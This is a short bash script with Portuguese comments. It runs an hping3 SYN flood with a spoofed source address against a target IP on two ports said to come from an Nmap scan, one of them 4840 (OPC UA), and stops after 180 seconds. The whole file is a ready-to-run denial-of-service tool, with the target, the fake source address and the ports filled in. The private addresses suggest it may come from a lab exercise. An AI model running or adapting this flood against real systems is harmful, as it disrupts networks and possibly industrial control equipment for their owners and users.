#!/bin/bash

# CONFIGURAÇÃO
TARGET="192.168.164.101"  # O alvo do ataque
FAKEIP="192.168.164.201"  # Endereço falso
BROADCAST="192.168.164.254"  # Endereço de broadcast da rede

PORTS=("4840" "4192")  # Utilizar as portas abertas encontradas no Nmap
PORTUDP="123"  # Utilizar uma porta UDP ativa

commandRunTime="180"

# EXECUÇÃO
for port in "${PORTS[@]}"; do
    commands+=("hping3 -S -a $FAKEIP -p $port --flood -V $TARGET")
done

# Executar comandos
for command in "${commands[@]}"; do
    $command &
done

# Aguarde o tempo especificado antes de encerrar os comandos
sleep $commandRunTime

# Encerre os comandos após o tempo especificado
killall hping3

